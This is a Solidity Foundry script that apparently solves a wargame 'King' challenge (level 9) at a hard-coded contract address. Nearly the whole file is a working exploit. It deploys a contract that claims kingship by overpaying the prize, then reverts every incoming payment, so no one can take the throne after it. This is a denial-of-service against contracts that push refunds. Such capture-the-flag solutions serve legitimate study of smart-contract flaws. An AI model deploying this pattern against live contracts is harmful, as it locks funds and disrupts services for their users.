// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King} from "src/9King.sol";

contract BreakKing {
    King public king;

    constructor(address _kingAddress) {
        king = King(payable(_kingAddress));
    }

    function attack() public payable {
        (bool success,) = address(king).call{value: msg.value}("");
        require(success, "Failed to become the king");
    }

    receive() external payable {
        revert("Nope, can't be dethroned");
    }
}

contract KingAttack is Script {
    address constant CHALLENGE = 0xd043ae99379Df19B340892BEbFcCD81c1797f413;

    BreakKing public breakKing;
    King public king;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        breakKing = new BreakKing(CHALLENGE);
        console.log("BreakKing deployed at:", address(breakKing));
        king = King(payable(CHALLENGE));
        uint256 val = king.prize() + 1;
        breakKing.attack{value: val}();
        console.log("Current King is:", king._king());
        vm.stopBroadcast();
    }
}
